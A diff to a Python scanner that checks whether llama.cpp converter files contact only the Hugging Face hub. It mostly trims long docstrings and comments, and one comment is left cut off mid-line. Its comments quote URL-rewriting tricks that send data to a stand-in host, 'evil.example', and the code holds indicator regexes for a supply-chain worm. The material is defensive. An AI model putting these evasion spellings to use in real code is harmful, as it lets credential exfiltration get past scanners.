@@ -1270,33 +975,7 @@ def _bound_names(target):
 
 
 def _reshapes_a_url(tree, assignments = None, aliases = None):
-    """Whether a URL this file spells out is transformed before it is used.
-
-    Reading every literal and asking whether each names a hub host assumes a
-    literal reaches the request as written. It need not:
-
-        BASE = "https://huggingface.co"
-        requests.get(BASE.replace("huggingface.co", "evil.example"), ...)
-
-    fetches evil.example, and every literal in that file is either the hub or a
-    bare name with no scheme in front of it, so nothing was recorded as a
-    destination but the hub. Slicing does the same with no method call at all.
-    So a URL literal, or a name that carries one, may not be the receiver of a
-    call or be subscripted here. Upstream is unaffected: in gguf-py/gguf/utility.py
-    every .replace(), .strip() and .format() receiver is a parameter, and
-    BASE_DOMAIN is only ever interpolated into an f-string.
-
-    A name carries through STRING BUILDING only: url = f"{BASE}/x" carries, and
-    url.replace(...) after it is refused. It deliberately does not carry through
-    a call, because upstream writes response = requests.get(url) and then reads
-    response.raise_for_status(), index_json["weight_map"], raw_data[:8]: tracking
-    what came BACK from the hub made ordinary parsing of the download look like a
-    reshaped URL and refused the very file this allowance exists for. A fixed
-    point, because an assignment can precede the one that makes its value carry.
-
-    A parameter is not tracked: following one means following a call, which is
-    the interprocedural residual this allowance already documents.
-    """
+    """Whether a URL this file spells out is transformed before it is used."""
     carriers = set()
     aliases = aliases if aliases is not None else _call_aliases(tree, assignments)
 
@@ -1330,7 +1009,7 @@ def _reshapes_a_url(tree, assignments = None, aliases = None):
             )
             return any(built_from_a_carrier(operand) for operand in operands)
         if isinstance(node, ast.Dict):
-            # URLS = {"hub": "https://huggingface.co"} then URLS["hub"].
+            # URLS = {"hub":
             return any(
                 value is not None and built_from_a_carrier(value)
                 for value in node.values
@@ -1354,15 +1033,9 @@ def _reshapes_a_url(tree, assignments = None, aliases = None):
             )
         return False
 
-    # Bounded, because each pass walks the whole tree and a chain of assignments
-    # that each carry the previous one needs a pass apiece: 2000 of them took 25
-    # seconds, on the path that decides whether an export may run. Real files
-    # settle in one or two. A file that has not settled by then is refused
-    # rather than spun on, which is the same answer this gives to everything
-    # else it cannot read in reasonable time.
-    # Collected once. Walking the whole tree per pass made a chain of 10000
-    # assignments take about two seconds, on a file the scan accepts at up to
-    # 8 MiB, and the chain is what forces the passes in the first place.
+    # Bounded, because each pass walks the whole tree and a chain of
+    # assignments that each carry the previous one needs a pass apiece: 2000 of
+    # them took 25 seconds, on the path that decides whether an export may run.
     assignments = []
     for node in ast.walk(tree):
         if isinstance(node, ast.Assign):
@@ -1390,29 +1063,15 @@ def _reshapes_a_url(tree, assignments = None, aliases = None):
     else:
         return True
     def extends_the_authority(node):
-        """Whether this expression appends to a carrier past its authority.
-
-        HUB + "@evil.example/collect" is fetched from evil.example, everything
-        before the @ being user information, while the walk sees only the hub
-        literal the name still holds. Appending a PATH is what upstream does,
-        so text beginning with a URL delimiter is fine and anything else, text
-        this cannot read included, is not.
-        """
+        """Whether this expression appends to a carrier past its authority."""
         whole = _literal_text(node)
         if whole is not None and UNKNOWN_PIECE not in whole:
             # It folds COMPLETELY, so the walk reads the URL it really builds:
-            # "https://hugging" + "face.co/api/models" is the hub, and judging
-            # that by its pieces refuses a file that names nothing else. A fold
-            # with a hole in it is not read by anyone, which is the case this
-            # check exists for.
             return False
         def flatten(node):
             # HUB + "/api/" + name parses as (HUB + "/api/") + name, so reading
             # two parts put the path inside the first one and the check never
-            # saw the delimiter that had already ended the authority. It then
-            # refused ordinary upstream-shaped code, which is the false positive
-            # this rule has to stay clear of. Iteratively, because a long chain
-            # of appends is exactly what nests deepest.
+            # saw the delimiter that had already ended the authority.
             parts, stack = [], [node]
             while stack:
                 item = stack.pop()
@@ -1458,20 +1117,13 @@ def _reshapes_a_url(tree, assignments = None, aliases = None):
             and _literal_text(node.value) is not None
         ):
             # A literal that is indexed or sliced:
-            # "c/tcelloc/elpmaxe.live//:sptth"[::-1] is a whole URL written
-            # backwards, and no rule here matched a scheme in it. Subscripting
-            # a name that CARRIES a URL was already refused; a literal that
-            # becomes one only when it is sliced is the same reshape with the
-            # text written out. Upstream slices what came back from the hub,
-            # raw_data[:8], which is not a literal.
             return True
         if _rewrites_a_constant(node, aliases):
             return True
         if isinstance(node, ast.Call) and called_name(node) in ("reduce", "accumulate"):
             # functools.reduce(operator.add, ["https", "://evil.example/c"])
             # builds a string out of pieces this walk reads one at a time, and
-            # the fold cannot follow a callable applied pairwise. No file in
-            # llama.cpp imports functools at all.
+            # the fold cannot follow a callable applied pairwise.
             return True
         if isinstance(node, ast.Call) and called_name(node) in URL_ASSEMBLERS:
             # No carrier and no URL literal: the destination is spelled field by
@@ -1495,8 +1147,6 @@ def _reshapes_a_url(tree, assignments = None, aliases = None):
         ):
             # A function can rewrite a URL as well as a method can:
             # urljoin(HUB, "//evil.example/collect") resolves to evil.example.
-            # Only the builders, since upstream passes its URL to urlparse and
-            # to its own helpers, and those read it rather than rebuild it.
             if called_name(node) in URL_BUILDERS:
                 return True
         if isinstance(node, ast.AugAssign) and (
@@ -1522,20 +1172,7 @@ def _reshapes_a_url(tree, assignments = None, aliases = None):
 
 
 def _docstrings(tree):
-    """Docstring nodes, which document a destination rather than name one.
-
-    Comments never reach here, since the walk reads the AST, so upstream's
-    `# Reference: https://github.com/...` costs nothing. A docstring saying the
-    same thing IS a Constant, and counting it as a destination refuses a clean
-    hub-only converter over a link in its own documentation, which is the false
-    positive this whole narrowing exists to remove.
-
-    Unless the file can REACH a docstring, in which case it is a value like any
-    other and the argument above stops holding. Enumerating the spellings was
-    losing: __doc__, fn.__doc__, getattr(fn, "__doc__") and vars(fn)["__doc__"]
-    all read the same string. So anything that names __doc__, vars or __dict__
-    at all keeps docstrings in the scan. Upstream names none of them.
-    """
+    """Docstring nodes, which document a destination rather than name one."""
     if any(
         (isinstance(node, ast.Name) and node.id in DOCSTRING_READERS)
         or (isinstance(node, ast.Attribute) and node.attr in DOCSTRING_READERS)
@@ -1573,10 +1210,7 @@ def _docstrings(tree):
 
 
 # The match patterns capture a name, and they do not exist before Python 3.10,
-# which this package still supports. Named at import rather than reached for
-# per node: ast.MatchAs raised AttributeError there, the allowance caught it and
-# refused, and the honest converter produced a CRITICAL finding on 3.9 alone.
-# isinstance against an empty tuple is simply False.
+# which this package still supports.
 MATCH_CAPTURES = tuple(
     pattern for pattern in
     (getattr(ast, name, None) for name in ("MatchAs", "MatchStar"))
@@ -1589,12 +1223,7 @@ MATCH_MAPPING = tuple(
 
 
 def _single_assignments(tree):
-    """`{name: value}` for every name this module binds exactly once.
-
-    Bindings of every kind are counted, not just assignments: a parameter, a
-    loop variable, an import or a `for` target that reuses the name means the
-    name is not one value, and anything but exactly one Assign is left alone.
-    """
+    """`{name: value}` for every name this module binds exactly once."""
     counts, values = {}, {}
 
     def bind(name, value = None):
@@ -1663,14 +1292,7 @@ DESCRIPTOR_METHODS = frozenset((
 
 
 def _bind_descriptor_calls(tree, assignments = None, aliases = None):
-    """The tree with `str.format(t, x)` rewritten as `t.format(x)`.
-
-    Called unbound, the receiver is the type rather than the template, so every
-    rule that reads a receiver saw `str` and the template went past as an
-    ordinary argument: str.format("{}://{}", "https", "evil.example/c") named
-    no destination at all. Rewriting it once here is what keeps the folds and
-    the refusals written one way.
-    """
+    """The tree with `str.format(t, x)` rewritten as `t.format(x)`."""
     # r = str.replace then r(HUB, "huggingface.co", "evil.example") is the same
     # call with the method behind a name, which no rule that reads a call site
     # could see.
@@ -1688,9 +1310,7 @@ def _bind_descriptor_calls(tree, assignments = None, aliases = None):
         ):
             rebound[name] = value.attr
 
-    # Rewritten in place, in one walk. A NodeTransformer over the whole tree
-    # cost 3.7 seconds of the 11 this allowance spent on a 6.4 MB file, and
-    # rebinding a call's function changes no structure for a parent to rewire.
+    # Rewritten in place, in one walk.
     for node in ast.walk(tree):
         if not isinstance(node, ast.Call) or not node.args:
             continue
@@ -1701,8 +1321,7 @@ def _bind_descriptor_calls(tree, assignments = None, aliases = None):
             and len(node.args) == 2
         ):
             # from operator import add, then add("https", "://evil.example/c"),
-            # and the same for mod and mul. Written as the method it is, so one
-            # fold reads every spelling.
+            # and the same for mod and mul.
             attribute = OPERATOR_FUNCTIONS[_called_name(node, aliases)]
         elif (
             isinstance(node.func, ast.Attribute)
@@ -1722,18 +1341,7 @@ def _bind_descriptor_calls(tree, assignments = None, aliases = None):
 
 
 def _inline_constants(tree, assignments = None):
-    """The tree with every single-assignment constant name read as its text.
-
-    scheme = "https"; separator = "://"; host = "evil.example" assembles a URL
-    that no literal in the file spells, and nothing here reads a name, so the
-    only destination recorded was an unused hub literal beside it. Substituting
-    the text a name can only ever hold puts the assembled URL back in front of
-    every rule that reads one, the destination walk included.
-
-    Only names bound exactly once, and only to text that folds with no hole in
-    it, under the same ceiling the folds use: this replaces a name with a value
-    it demonstrably has, never with a guess.
-    """
+    """The tree with every single-assignment constant name read as its text."""
     uses = {}
     for node in ast.walk(tree):
         if isinstance(node, ast.Name) and isinstance(node.ctx, ast.Load):
@@ -1751,8 +1359,7 @@ def _inline_constants(tree, assignments = None):
     # To a fixed point, because one constant can be assigned through another:
     # scheme = "https"; alias = scheme leaves alias unreadable until scheme has
     # been substituted, and the assembled URL was invisible for want of one
-    # more pass. Bounded like the carrier fixpoint, and real files settle in
-    # the first pass.
+    # more pass.
     texts, budget = {}, MAX_FOLDED_JOIN
     for _ in range(MAX_CARRIER_PASSES):
         if not _fold_constants(assignments, texts, uses, budget):
@@ -1783,7 +1390,7 @@ def _fold_constants(assignments, texts, uses, budget):
         # Per USE, not per name: one 50 KB constant loaded a hundred times is
         # five megabytes of text out of a 49 KB file, and folding the growing
         # prefixes of that took six seconds on a file the scan accepts at up to
-        # 8 MiB. The budget is on what the substitution materialises.
+        # 8 MiB.
         budget -= len(text) * uses.get(name, 0)
         if budget < 0:
             # Not a break: leaving the rest of the file unsubstituted analyses a
@@ -1796,13 +1403,7 @@ def _fold_constants(assignments, texts, uses, budget):
 
 
 def _literal_texts(tree, skip = frozenset()):
-    """Every whole literal expression in `tree`, folded ones in place of parts.
-
-    A folded expression is not descended into: reading "https://hugging" +
-    "face.co/api/models" as the hub AND as a host called `hugging` refuses the
-    allowance over a file that only ever names the hub, which is the false
-    positive this whole narrowing exists to remove.
-    """
+    """Every whole literal expression in `tree`, folded ones in place of parts."""
     stack = [tree]
     while stack:
         node = stack.pop()
@@ -1816,13 +1417,7 @@ def _literal_texts(tree, skip = frozenset()):
 
 
 def _authority_host(authority):
-    """The hostname an authority names, "" when it names none, None when unclear.
-
-    Empty is the bare "https://" that upstream's metadata.py hands to startswith:
-    it names no destination, so it says nothing either way. Anything else has to
-    look like a plain host with an optional port. If it does not, this cannot say
-    where the request goes, and not knowing is not a reason to allow it.
-    """
+    """The hostname an authority names, "" when it names none, None when unclear."""
     if not authority:
         return ""
     if not RE_HOSTNAME.match(authority):
@@ -1831,30 +1426,7 @@ def _authority_host(authority):
 
 
 def _talks_only_to_the_model_hub(text):
-    """Whether every URL this file names in code is a model-hub host.
-
-    Read from string literals via the AST, not from the raw text, so the github
-    links upstream carries in comments do not count as destinations. Requires at
-    least one hub host: a file that names no destination at all has built it
-    some other way, and that is not evidence of anything except that this cannot
-    see it. An authority that does not look like a plain hostname refuses the
-    allowance outright, whatever it contains, and so does any use of a network
-    API that takes a bare host rather than a URL.
-
-    This is a deliberate narrowing of a CRITICAL rule, and the evasion is not
-    hypothetical: taking upstream's utility.py and changing one call to
-    `requests.get(os.environ["X"] + "/collect", ...)` leaves the hub literal in
-    place, so this suppresses the finding. Adding a literal exfil URL is caught,
-    as is a payload that names no host at all, since suppression needs a hub host
-    to be named.
-
-    Kept anyway, because the alternative measured worse: with the rule as it
-    was, UNSLOTH_CONVERTER_SCAN_STRICT refused every clean checkout of llama.cpp
-    master over upstream's own file, and a control that rejects what it is meant
-    to protect is one people switch off. The scan says of itself that it raises
-    the cost of an opportunistic payload and is not a boundary; this is inside
-    that claim, not a departure from it.
-    """
+    """Whether every URL this file names in code is a model-hub host."""
     if _matches(RE_UNVOUCHABLE_NETWORK, text):
         # A destination this allowance never looks at, so it cannot vouch for it.
         return False
@@ -1878,19 +1450,12 @@ def _talks_only_to_the_model_hub(text):
         # scan_converter_source does not catch either, and
         # warn_on_suspicious_converter catches everything and CONTINUES, so a
         # payload could append one such expression to itself and have the whole
-        # scan report nothing, in strict mode included. Refusing is the answer
-        # to every failure here, so the class of failure does not matter.
+        # scan report nothing, in strict mode included.
         return False
 
 
 def _scheme_hides_a_hole(literal):
-    """Whether a hole sits inside the scheme of any URL in this text.
-
-    A hole immediately before :// was not the only way to spell one: "%cttps"
-    supplies a single character of it, and "\x00ttps://evil.example/c" matched
-    no scheme either. A scheme is short, so the whole of it is read back from
-    the separator rather than only the character before it.
-    """
+    """Whether a hole sits inside the scheme of any URL in this text."""
     index = literal.find("://")
     while index != -1:
         if UNKNOWN_PIECE in literal[max(0, index - MAX_SCHEME):index]:
@@ -1911,18 +1476,13 @@ def _talks_only_to_the_model_hub_tree(tree, text):
 
 def _talks_only_to_the_model_hub_parsed(tree, text):
     """The allowance proper, under the fold budget its caller opened."""
-    # Read once and handed on. Every binding form is counted by walking the
-    # whole tree, and doing that per transformation was over half the time this
-    # allowance spent on a 6.4 MB file: 9.3 seconds of 16.
+    # Read once and handed on.
     assignments = _single_assignments(tree)
     aliases = _call_aliases(tree, assignments)
     tree = _bind_descriptor_calls(tree, assignments, aliases)
     tree = _inline_constants(tree, assignments)
     if _writes_anything(tree):
-        # Sending TO the hub is not downloading from it. The hub is writable and
-        # multi-tenant: a token with write scope can create a public repository
-        # there and make it a channel anyone can read back, so "the destination
-        # is the hub" is not on its own a reason to say nothing.
+        # Sending TO the hub is not downloading from it.
         return False
     if _imports_an_unvouchable_api(tree, aliases):
         # A destination this allowance never looks at, arriving by another door.
@@ -1955,20 +1515,12 @@ def _talks_only_to_the_model_hub_parsed(tree, text):
         # an unattributable one used to pass by leaving the set empty.
         return False
     if not names or not names <= HUB_TOKEN_ENV_NAMES:
-        # EVERY name, not the ones that look secret. Filtering on keywords let
-        # GITHUB_PAT through, because "PAT" is not one of them, and a file
-        # reading HF_TOKEN and GITHUB_PAT then sending the second one to the hub
-        # produced no finding at all. Nothing here can tell a credential from a
-        # setting by its name, so the allowance covers reading the hub's own
-        # token and nothing else. The only upstream file this applies to reads
-        # exactly HF_TOKEN.
+        # EVERY name, not the ones that look secret.
         return False
     hosts = set()
-    # bytes as well as str: requests decodes b"https://evil.example/collect" and
-    # accepts it, so skipping bytes constants let a destination hide in one while
-    # a str hub literal stayed in the file.
-    # Iterated, not materialised, and budgeted in aggregate: MAX_FOLDED_JOIN
-    # bounds one expansion, and an 8 MiB file holds thousands of them.
+    # bytes as well as str: requests decodes b"https://evil.example/collect"
+    # and accepts it, so skipping bytes constants let a destination hide in one
+    # while a str hub literal stayed in the file.
     def folded_literals():
         budget = MAX_FOLDED_JOIN
         for literal in _literal_texts(tree, skip = _docstrings(tree)):
@@ -1982,34 +1534,22 @@ def _talks_only_to_the_model_hub_parsed(tree, text):
             if _scheme_hides_a_hole(literal):
                 # The scheme itself came out of a piece this cannot read, so
                 # the destination is not merely unnamed, it is hidden: nothing
-                # in the file spells a URL for the walk below to look at. Every
-                # upstream "://" is preceded by a readable http, https or ssh.
+                # in the file spells a URL for the walk below to look at.
                 return False
             for match in RE_URL_SCHEME.finditer(literal):
                 if match.group().lower().startswith("http://"):
                     # A token sent to the hub over plaintext is a token anyone
                     # on the path can read, and this allowance exists to say
-                    # nothing about a file that sends one. Upstream's
-                    # BASE_DOMAIN is https, and so is every URL it builds.
+                    # nothing about a file that sends one.
                     return False
                 rest = literal[match.end():]
                 end = RE_AUTHORITY_END.search(rest)
                 if end is None and rest:
-                    # No delimiter, so the authority runs to the end of the literal:
-                    # "https://huggingface.co", which is upstream's BASE_DOMAIN.
+                    # No delimiter, so the authority runs to the end of the
+                    # literal:
                     host = _authority_host(rest)
                 elif end is None:
-                    # Nothing at all after the scheme. Reading that as "names no
-                    # destination" is what every splitting trick was built on:
-                    # "https://" + host, "".join(("https://", host)),
-                    # "{}evil.example".format("https://"), each leaves a bare scheme
-                    # in one literal and the host somewhere this does not connect to
-                    # it. A scheme with no authority means the destination is
-                    # assembled, and an assembled one is not a destination this can
-                    # vouch for. Upstream's bare "https://" literals are in
-                    # metadata.py, which never reaches this allowance: only
-                    # gguf-py/gguf/utility.py does, measured on master, and it has
-                    # none.
+                    # Nothing at all after the scheme.
                     host = None
                 elif end.start() == 0:
                     # A path with no host, as in https:///collect. requests will not
@@ -2235,9 +1775,7 @@ RE_C2_POLLING = re.compile(
     re.DOTALL,
 )
 
-# Mini Shai-Hulud May-12 2026 wave indicators. The dropper artifact name
-# `transformers.pyz` is high-confidence (no legit PyPI package ships a `.pyz`
-# named after `transformers`); the host + slogans are CRITICAL.
+# Mini Shai-Hulud May-12 2026 wave indicators.
 RE_MAY12_IOC = re.compile(
     r"(git-tanstack\.com|/tmp/transformers\.pyz|transformers\.pyz"
     r"|With Love TeamPCP|We've been online over 2 hours)",
@@ -2245,17 +1783,15 @@ RE_MAY12_IOC = re.compile(
 )
 
 # The exact regex llama_cpp.py uses to scrape argparse defaults out of the
-# downloaded bytes before eval()ing them. Defined here, and imported there, so
-# the scanner and the eval can never look at different tokens.
+# downloaded bytes before eval()ing them.
 RE_ARGPARSE_DEFAULT = re.compile(
     rb"parser\.add_argument\([\s]*[\"\']([^\"\']{1,})[\'\"][^\)]*(?:action=|default=)[\s]*([^,\s\)]+)"
 )
 
-# A default token that is a literal, or a plain (possibly dotted) name. Anything
-# else reaching eval() is a call, an operator, a subscript or a comprehension.
+# A default token that is a literal, or a plain (possibly dotted) name.
 RE_PLAIN_NAME = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*(?:\.[A-Za-z_][A-Za-z0-9_]*)*$")
 
-# Vendored pattern registry. The pin test walks this mapping.
+# Vendored pattern registry.
 VENDORED_PATTERNS = {
     "RE_SUBPROCESS": RE_SUBPROCESS,
     "RE_BASE64": RE_BASE64,
@@ -2282,9 +1818,7 @@ VENDORED_PATTERNS = {
     "RE_MAY12_IOC": RE_MAY12_IOC,
 }
 
-# Canonical patterns deliberately left out, with the reason. The pin test asserts
-# this set plus VENDORED_PATTERNS accounts for every RE_* in the canonical
-# scanner, so a new pattern there forces a decision here instead of being missed.
+# Canonical patterns deliberately left out, with the reason.
 PATTERNS_NOT_VENDORED = {
     "RE_PTH_IMPORT": "belongs to check_pth_file; a converter is not a .pth file",
     "RE_DEV_TOOL_HIJACK": "check_py_file does not consume it",
@@ -2313,24 +1847,7 @@ class ConverterScanError(RuntimeError):
 # ---------------------------------------------------------------------------
 # Linear-time evaluation of the whole-file patterns
 # ---------------------------------------------------------------------------
-# Several canonical patterns are shaped `A.*B.*C` under re.DOTALL. Run against a
-# file that holds many A and B but no C, the engine tries every (A, B) pair
-# before it can report "no match": measured at 2.0s on 5 KB and 17.3s on 11 KB,
-# growing with the cube of the input. The bytes being scanned are the ones we do
-# not trust, so an attacker who cannot beat the rules could still hang every GGUF
-# export with a file full of the word "socket". A try/except cannot catch a hang.
-#
-# So the boolean is computed without backtracking across the `.*` joins. For
-# existence, `A.*B` under DOTALL holds exactly when some A is followed by some B,
-# which is what searching for B from the end of the earliest A answers, in linear
-# time. Top-level `|` is split the same way, since "either alternative matches"
-# is the same question. The compiled pattern is untouched and still byte-pinned
-# to scan_packages; only how its answer is computed changes, and
-# test_llama_cpp_converter_scan.py fuzzes the two against each other.
-#
-# Anything this decomposition cannot handle safely (a `.` wildcard nested inside
-# a group, a `.+` whose "at least one character" would be lost, a segment that
-# does not compile on its own) falls back to the pattern itself.
+# Several canonical patterns are shaped `A.*B.*C` under re.DOTALL.
 
 
 def _split_top_level_alternatives(source):
